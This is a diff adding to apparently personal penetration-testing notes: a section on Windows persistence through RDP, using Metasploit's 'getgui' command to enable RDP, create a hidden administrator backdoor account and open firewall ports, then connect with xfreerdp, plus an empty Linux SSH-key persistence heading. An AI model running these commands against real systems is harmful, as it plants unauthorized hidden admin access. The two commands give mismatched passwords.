@@ -1514,6 +1514,31 @@ With an anonymous null session you can access the IPC$ share and interact with s
     - This module will generate a payload, upload it to the target and make it persistent via a service
     - when quitting the session and you want to reconnect to the target, remember to setup a multi/handler listener with the exact same payload specified and the LPORT specified.
   
+  ### Persistence Via RDP
+  - when exploited, we can create a backdoor user account
+  - metasploit
+    - "run getgui -e -u felix -p abc123_321"
+    - This command will do the following:
+      - See if RDP is enabled, if not, it will enable it (and set it to startup mode)
+      - Create a new user (the one we've specified)
+      - Add the User to the RDP Users
+      - Add the User to Administrator Group
+      - Hide the User from logon screen
+      - Open Neccessary Firewall Ports
+  - we can user xfreerdp to connecto to the target
+    - xfreerdp /u:felix /p:abc123_312 /v:x.x.x.x
+    
+    
+    ## Linux Persistence
+    ### Persistence via SSH Keys
+    
+  
+  
+  
+  
+  
+  
+  
   
   
   
